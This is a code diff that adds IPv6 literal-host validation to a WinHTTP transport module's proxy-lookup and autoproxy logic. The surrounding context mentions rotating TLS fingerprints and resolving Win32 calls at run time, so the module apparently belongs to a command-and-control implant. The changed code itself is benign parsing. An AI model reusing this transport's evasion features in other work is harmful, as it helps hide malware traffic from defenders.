@@ -10,6 +10,89 @@
 #define WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3 0x00002000
 #endif
 
+static BOOL HttpIsHexDigitW(
+    WCHAR Ch
+)
+{
+    return ( Ch >= L'0' && Ch <= L'9' )
+        || ( Ch >= L'a' && Ch <= L'f' )
+        || ( Ch >= L'A' && Ch <= L'F' );
+}
+
+static BOOL HttpIsLiteralIpv6Host(
+    LPCWSTR Host
+)
+{
+    LPCWSTR Scan;
+    SIZE_T  Len;
+    DWORD   ColonCount = 0;
+    BOOL    InZone     = FALSE;
+
+    if ( ! Host || ! Host[ 0 ] ) {
+        return FALSE;
+    }
+
+    Scan = Host;
+    Len  = StringLengthW( Host );
+
+    if ( Host[ 0 ] == L'[' ) {
+        SIZE_T End = 1;
+
+        while ( Host[ End ] && Host[ End ] != L']' ) {
+            End++;
+        }
+
+        if ( End == 1 || Host[ End ] != L']' || Host[ End + 1 ] != L'\0' ) {
+            return FALSE;
+        }
+
+        Scan = Host + 1;
+        Len  = End - 1;
+    }
+
+    for ( SIZE_T i = 0; i < Len; i++ ) {
+        WCHAR Ch = Scan[ i ];
+
+        if ( Ch == L':' ) {
+            if ( InZone ) {
+                return FALSE;
+            }
+            ColonCount++;
+            continue;
+        }
+
+        if ( Ch == L'%' ) {
+            if ( InZone || i == 0 || i + 1 >= Len ) {
+                return FALSE;
+            }
+            InZone = TRUE;
+            continue;
+        }
+
+        if ( InZone ) {
+            if (
+                ( Ch >= L'0' && Ch <= L'9' )
+                || ( Ch >= L'a' && Ch <= L'z' )
+                || ( Ch >= L'A' && Ch <= L'Z' )
+                || Ch == L'.'
+                || Ch == L'-'
+                || Ch == L'_'
+            ) {
+                continue;
+            }
+            return FALSE;
+        }
+
+        if ( HttpIsHexDigitW( Ch ) || Ch == L'.' ) {
+            continue;
+        }
+
+        return FALSE;
+    }
+
+    return ColonCount >= 2;
+}
+
 /*!
  * @brief
  *  Rotate the per-connection TLS fingerprint (ARC-06).
@@ -123,8 +206,8 @@ static LPWSTR HttpComposeUrlForProxyLookup(
     scheme  = Instance->Config.Transport.Secure ? L"https://" : L"http://";
     hostUse = H->Host;
 
-    /* RFC 3986 / WinHTTP: bracketed IPv6 already includes '[' ']'; do not wrap twice. */
-    if ( hostUse[ 0 ] == L'[' ) {
+    /* RFC 3986 / WinHTTP: accept bracketed IPv6 only when the closing ']' is present. */
+    if ( hostUse[ 0 ] == L'[' && HttpIsLiteralIpv6Host( hostUse ) ) {
         nw = Instance->Win32.swprintf_s(
             Buf,
             CchBuf,
@@ -134,7 +217,9 @@ static LPWSTR HttpComposeUrlForProxyLookup(
             ( ULONG ) H->Port,
             RelativePath
         );
-    } else if ( WcsStr( H->Host, L":" ) != NULL ) {
+    } else if ( hostUse[ 0 ] == L'[' ) {
+        return RelativePath;
+    } else if ( HttpIsLiteralIpv6Host( H->Host ) ) {
         /* Unbracketed IPv6: strip zone id (%scope) so WinHttpGetProxyForUrl sees a valid host. */
         zi = 0;
         while (
@@ -146,6 +231,9 @@ static LPWSTR HttpComposeUrlForProxyLookup(
             }
             HostNz[ zi ] = hostUse[ zi ];
             zi++;
+        }
+        if ( hostUse[ zi ] != L'\0' && hostUse[ zi ] != L'%' ) {
+            return RelativePath;
         }
         HostNz[ zi ] = L'\0';
 
@@ -238,17 +326,11 @@ static BOOL HttpHostSkipsWinHttpAutoproxy(
         return FALSE;
     }
 
-    /* Bracketed IPv6 as passed to WinHttpConnect, e.g. [::1] */
-    if ( Host[ 0 ] == L'[' ) {
-        return TRUE;
-    }
-
     if ( HttpIsLiteralIpv4Host( Host ) ) {
         return TRUE;
     }
 
-    /* Unbracketed IPv6 / zone (no dots in typical v6 host field) */
-    if ( WcsStr( Host, L":" ) != NULL && WcsStr( Host, L"." ) == NULL ) {
+    if ( HttpIsLiteralIpv6Host( Host ) ) {
         return TRUE;
     }
 
